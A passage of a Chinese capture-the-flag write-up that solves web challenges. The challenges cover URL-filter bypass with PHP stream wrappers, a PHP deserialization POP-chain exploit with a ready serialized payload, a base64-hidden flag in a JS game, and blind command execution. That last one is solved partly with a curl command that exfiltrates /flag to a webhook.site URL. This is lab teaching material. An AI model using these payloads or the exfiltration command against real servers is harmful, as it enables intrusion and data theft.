href="https://xxxx.com/">xxxx.com</a>@10.10.10.10，则实际上访问的是 10.10.10.10 这个地址。</li><li>网址后加 xip.io，其原理是例如 10.10.10.10.xip.io 会被解析成 10.10.10.10。</li><li>进制转换，将 ip 转换成八进制、十进制、十六进制这种，同样也可以正常访问，例如将 10.10.10.10 转换为十进制是 168430090，在浏览器访问 <a target="_blank" rel="noopener" href="http://10.10.10.10/">http://168430090</a> 就会去访问 10.10.10.10 这个地址。</li></ul><h3 id="题解：-5"><a href="#题解：-5" class="headerlink" title="题解："></a>题解：</h3><p>进入题目，得如下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 高亮显示当前文件内容，方便调试和查看代码结构</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Aura 酱，欢迎回家~</span></span><br><span class="line"><span class="comment">// 这里有一份礼物，请你签收一下哟~</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 POST 请求中的参数 &#x27;pen&#x27; 的值并赋值给 $pen</span></span><br><span class="line"><span class="variable">$pen</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pen&#x27;</span>];</span><br><span class="line"><span class="comment">// 如果通过 file_get_contents 函数读取 $pen 所指向的内容不等于 &#x27;Aura&#x27;，输出错误信息并终止程序</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pen</span>)!== <span class="string">&#x27;Aura&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 礼物收到啦，接下来要去博客里面写下感想哦~</span></span><br><span class="line"><span class="comment">// 获取 POST 请求中的参数 &#x27;challenge&#x27; 的值并赋值给 $challenge</span></span><br><span class="line"><span class="variable">$challenge</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;challenge&#x27;</span>];</span><br><span class="line"><span class="comment">// 如果 $challenge 不以 &#x27;http://jasmineaura.github.io&#x27; 开头，输出错误信息并终止程序</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$challenge</span>, <span class="string">&#x27;http://jasmineaura.github.io&#x27;</span>)!== <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这不是 Aura 的博客！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过 file_get_contents 函数读取 $challenge 所指向的博客内容并赋值给 $blog_content</span></span><br><span class="line"><span class="variable">$blog_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$challenge</span>);</span><br><span class="line"><span class="comment">// 如果 $blog_content 中不包含 &#x27;已经收到 Kengwang 的礼物啦&#x27;，输出错误信息并终止程序</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$blog_content</span>, <span class="string">&#x27;已经收到 Kengwang 的礼物啦&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;请去博客里面写下感想哦~&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span></span><br><span class="line"><span class="comment">// 获取 POST 请求中的参数 &#x27;gift&#x27; 的值并赋值给 $gift</span></span><br><span class="line"><span class="variable">$gift</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;gift&#x27;</span>];</span><br><span class="line"><span class="comment">// 尝试包含由 $gift 指定的文件，这里假设是包含 flag.php 文件，但这样的代码存在安全风险，因为可以通过用户输入的 $gift 包含任意文件</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$gift</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先使用 data:&#x2F;&#x2F;伪协议</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731675060725-d50390c8-1d9b-434c-9c0d-a6397edd13aa.png" referrerpolicy="no-referrer"></p><p>第二步要以 <a target="_blank" rel="noopener" href="http://jasmineaura.github.io/">http://jasmineaura.github.io</a> 开头,因为博客打不开又要再里面写内容,可以使用@ 符号将 url 地址转接到本机上.可见绕过成功了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731675364378-230c9a1c-bfeb-4459-9aae-54b9de346274.png" referrerpolicy="no-referrer"></p><p>接下来包含文件,但是不没有看到回显,猜测可能在 php 文件的注释里,利用 php:&#x2F;&#x2F;filter伪协议把注释带出来,注意要编码(要不然注释还是会被当作注释,带不出来)</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731675447214-1b2cb9bd-2f91-4be5-8dd2-b63c6c6113b1.png" referrerpolicy="no-referrer"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731675749560-603647c5-c44c-4006-a122-85f0ef0ffb02.png" referrerpolicy="no-referrer"></p><p>最后进行 base64 解码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1730728516429-ffb17993-a309-4d84-8db1-2aa8645a9dc1.png" referrerpolicy="no-referrer"></p><h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="ez-ser"><a href="#ez-ser" class="headerlink" title="ez_ser"></a>ez_ser</h2><h3 id="考点：-6"><a href="#考点：-6" class="headerlink" title="考点："></a>考点：</h3><p><strong>反序列化和 php 魔术方法</strong></p><p><strong>魔术方法:</strong></p><p>1.__construct，__destruct</p><p>__constuct构建对象的时被调用；</p><p>__destruct明确销毁对象或脚本结束时被调用；</p><p>2.__get，__set</p><p>__set当给不可访问或不存在属性赋值时被调用</p><p>__get读取不可访问或不存在属性时被调用</p><p>3.__isset，__unset</p><p>__isset对不可访问或不存在的属性调用isset()或empty()时被调用</p><p>__unset对不可访问或不存在的属性进行unset时被调用</p><p>4.__call，__callStatic</p><p>__call调用不可访问或不存在的方法时被调用</p><p>__callStatic调用不可访问或不存在的静态方法时被调用</p><p>5.__sleep，__wakeup</p><p>__sleep当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用</p><p>__wakeup当使用unserialize时被调用，可用于做些对象的初始化操作</p><p>6.__clone</p><p>进行对象clone时被调用，用来调整对象的克隆行为</p><p>7.__toString</p><p>当一个类被转换成字符串时被调用</p><p>8.__invoke</p><p>当以函数方式调用对象时被调用</p><p>9.__set_state</p><p>当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。</p><p>10.__debuginfo</p><p>当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本</p><p><strong>pop 链构造的关键就是充分利用各种魔术方法的特性,实现一个接一个的自动调用,最后获取 flag</strong></p><h3 id="题解：-6"><a href="#题解：-6" class="headerlink" title="题解："></a>题解：</h3><p>进入题目，得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 高亮显示当前文件内容，方便调试和查看代码结构</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// 关闭错误报告</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义类 re</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">re</span></span>&#123;</span><br><span class="line">    <span class="comment">// 定义公共属性 chu0</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="comment">// 定义魔术方法 __toString，当对象被当作字符串使用时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 如果 chu0 属性未设置</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;chu0))&#123;</span><br><span class="line">            <span class="comment">// 返回一个字符串</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I can not believes!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 这里尝试访问一个未定义的属性 $nononono，可能会导致错误</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0-&gt;<span class="variable">$nononono</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义类 web</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义公共属性 kw</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kw</span>;</span><br><span class="line">    <span class="comment">// 定义公共属性 dt</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dt</span>;</span><br><span class="line">    <span class="comment">// 定义魔术方法 __wakeup，在对象被反序列化时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 输出字符串和 kw 属性的值</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;lalalla&quot;</span>.<span class="variable language_">$this</span>-&gt;kw;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 定义魔术方法 __destruct，当对象被销毁时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 输出字符串</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ALL Done!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义类 pwn</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义公共属性 dusk</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dusk</span>;</span><br><span class="line">    <span class="comment">// 定义公共属性 over</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$over</span>;</span><br><span class="line">    <span class="comment">// 定义魔术方法 __get，当尝试访问一个不存在的属性时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 如果 dusk 属性不等于 &quot;gods&quot;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;dusk!= <span class="string">&quot;gods&quot;</span>)&#123;</span><br><span class="line">            <span class="comment">// 输出字符串</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;什么，你竟敢不认可?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 调用 over 属性的 getflag 方法</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;over-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义类 Misc</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义公共属性 nothing</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nothing</span>;</span><br><span class="line">    <span class="comment">// 定义公共属性 flag</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="comment">// 定义方法 getflag</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 使用 eval 执行 system 函数来执行命令，这里是读取 /flag 文件内容，存在安全风险</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义类 Crypto</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义魔术方法 __wakeup，在对象被反序列化时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 输出字符串</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;happy happy happy!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 定义方法 getflag</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 输出字符串</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are over!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 GET 请求中的参数 &#x27;ser&#x27; 的值并赋值给 $ser</span></span><br><span class="line"><span class="variable">$ser</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>];</span><br><span class="line"><span class="comment">// 尝试反序列化 $ser 的内容，可能存在安全风险，因为用户可以控制反序列化的数据</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>pop 链构造思路</p><p>unserialize()-&gt;web 类的 wakeup()[ 函数内部的 . 拼接字符串]-&gt;re 类的 tostring() [函数内部尝试访问一个未定义的属性,如果有 get() 函数,则会自动调用]-&gt;pwn 类的 get() [ 函数内部调用了 getflag()函数 ]-&gt;Misc 类的 getflag()函数-&gt;得到 flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">re</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;chu0))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I can not believes!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0-&gt;<span class="variable">$nononono</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kw</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dt</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;lalalla&quot;</span>.<span class="variable language_">$this</span>-&gt;kw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ALL Done!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dusk</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$over</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;dusk != <span class="string">&quot;gods&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;什么，你竟敢不认可?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;over-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nothing</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">re</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">web</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">pwn</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">misc</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>-&gt;over = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;chu0 = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;kw = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ser=&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ser=O:<span class="number">3</span>:<span class="string">&quot;web&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;kw&quot;</span>;O:<span class="number">2</span>:<span class="string">&quot;re&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;chu0&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;pwn&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;dusk&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;over&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Misc&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;nothing&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;N;&#125;&#125;&#125;s:<span class="number">2</span>:<span class="string">&quot;dt&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>$_GET 传参</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1730729607854-ca30ef09-65de-435c-b116-d9de025f007c.png" referrerpolicy="no-referrer"></p><h2 id="一起吃豆豆"><a href="#一起吃豆豆" class="headerlink" title="一起吃豆豆"></a>一起吃豆豆</h2><h3 id="考点：-7"><a href="#考点：-7" class="headerlink" title="考点："></a>考点：</h3><p><strong>玩游戏题,一般可以读 js 代码获取灵感</strong></p><h3 id="题解：-7"><a href="#题解：-7" class="headerlink" title="题解："></a>题解：</h3><p>这是一个 js 写的游戏</p><p>进入之后就是玩游戏，应该游戏通关之后就会给答案了</p><p>这里找到游戏的 js 代码，虽然 F12 和 ctrl+shift+I 都没用，但是还可以手动点更多工具里面的 web 开发者工具</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1730730349012-ba6706bd-2997-4f1f-89c7-9e9e5b730044.png" referrerpolicy="no-referrer"></p><p>找到游戏结束的代码,丢给 AI 加注释</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用context.fillText方法来绘制文本</span></span><br><span class="line"><span class="comment">// _LIFE是一个变量，这里通过条件判断来决定要绘制的文本内容</span></span><br><span class="line"><span class="comment">// 如果_LIFE为真（true）</span></span><br><span class="line">context.<span class="title function_">fillText</span>(</span><br><span class="line">    <span class="comment">// 使用atob函数对Base64编码的字符串进行解码</span></span><br><span class="line">    <span class="comment">// &quot;QmFzZUNURntKNV9nYW0zXzFzX2Vhc3lfdDBfaDRjayEhfQ==&quot;是一个Base64编码的字符串</span></span><br><span class="line">    _LIFE? <span class="title function_">atob</span>(<span class="string">&quot;QmFzZUNURntKNV9nYW0zXzFzX2Vhc3lfdDBfaDRjayEhfQ==&quot;</span>) : <span class="string">&#x27;GAME OVER&#x27;</span>,</span><br><span class="line">    <span class="comment">// this.x和this.y是文本绘制的坐标位置</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">x</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">y</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>可以直接进行 base64 解码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1730730417021-606b72f4-863b-4054-9aa0-6cf3ba1f0518.png" referrerpolicy="no-referrer"></p><p>也可以在控制台执行这个函数，得到 flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1730730459169-6d744a34-c58f-47ed-97e5-a7e0814f2d1e.png" referrerpolicy="no-referrer"></p><h2 id="你听不到我的声音"><a href="#你听不到我的声音" class="headerlink" title="你听不到我的声音"></a>你听不到我的声音</h2><h3 id="考点：-8"><a href="#考点：-8" class="headerlink" title="考点："></a>考点：</h3><p><strong>shell_exec()函数</strong></p><p>通过 shell 执行命令并将完整的输出以字符串的方式返回(有返回值没有回显**)**</p><p><strong>linux 重定向符号:</strong><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-shell-io-redirections.html"><strong>参考文章</strong></a></p><p>command &gt; file ( 将输出重定向到 file )</p><h3 id="题解：-8"><a href="#题解：-8" class="headerlink" title="题解："></a>题解：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br></pre></td></tr></table></figure><p>代码很简单，但是 shell_exec()函数不会直接回显，</p><p><strong>方法一:</strong> 可以用重定向</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1730732002721-625a02cd-1420-4606-8f41-2e8adc197d23.png" referrerpolicy="no-referrer"></p><p>浏览器打开</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1730732072982-02243eb3-94e6-4e37-9667-f2d9f2f3cf85.png" referrerpolicy="no-referrer"></p><p>找到文件，之后 cat &#x2F;flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1730732139656-db0c46ad-b693-43ae-b0f3-952727d23709.png" referrerpolicy="no-referrer"></p><p>再次打开 1.txt，得到源码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1730732160660-e598e305-b6b4-411b-8de9-fa6b73ead6b3.png" referrerpolicy="no-referrer"></p><p>**方法二:**使用 curl 外带</p><p>进入<a target="_blank" rel="noopener" href="https://webhook.site/"> webhook 网站</a></p><p>会得到一个自己的网址<img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731686817280-87a0624f-84ce-4455-8d2b-6d5f409a89ed.png" referrerpolicy="no-referrer"></p><p>按照这样的格式,url 编码之后,post 传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://webhook.site/b69846b7-ea9a-42f6-8e7a-04f80fdf35eb/`cat /flag | base64`</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731686302150-eb00aac5-5bee-4f16-bc61-89e82313eb45.png" referrerpolicy="no-referrer"></p><p>回到网站,得到请求了.网址后边的东西解码一下</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731686436635-7aa344c8-bf3c-4998-8023-de01ad0af854.png" referrerpolicy="no-referrer"></p><p>得到 flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731686498904-622d38e6-c2a2-4186-b516-f40f1ca15db6.png" referrerpolicy="no-referrer"></p><p><strong>方法三:Dnslog 外带</strong></p><p><strong>在刚才的网站拿到 DNS name</strong></p><p><img 